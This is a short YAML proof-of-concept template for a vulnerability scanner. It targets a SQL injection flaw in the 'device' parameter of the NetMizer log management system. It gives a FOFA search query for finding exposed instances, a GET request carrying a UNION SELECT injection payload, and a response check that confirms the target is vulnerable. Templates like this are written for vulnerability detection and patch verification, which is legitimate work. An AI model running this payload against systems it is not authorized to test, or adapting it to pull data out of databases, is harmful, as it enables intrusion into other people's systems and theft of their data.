id: poc-yaml-netmizer-log-ms-device-sqli
info:
  name: NetMizer 日志管理系统 device SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: NetMizer 日志管理系统
  fofa: app="NetMizer-日志管理系统"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /data/echart/terminals.php?action=phonelist-grid&device=-111+UNION+ALL+SELECT+null,CONCAT(0x7e,(select/**/md5({{.t1}})),0x7e),null,null,null,null,null--
  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"out_bytes")
    && !contains(body,"<") && contains(body,t2)
transport: http
